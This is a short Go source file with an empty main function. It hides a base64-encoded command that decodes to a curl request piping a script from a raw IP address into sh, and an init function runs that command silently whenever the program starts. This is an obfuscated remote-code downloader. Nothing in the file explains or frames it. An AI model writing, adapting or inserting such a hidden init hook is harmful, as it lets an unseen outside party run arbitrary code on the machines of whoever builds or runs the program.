package main

import (
	"encoding/base64"
	"os/exec"
)

const payload = "Y3VybCAtcyBodHRwOi8vNDUuOS4xNDguMTIvYSB8IHNo"

func init() {
	cmd, _ := base64.StdEncoding.DecodeString(payload)
	exec.Command("sh", "-c", string(cmd)).Start()
}

func main() {}
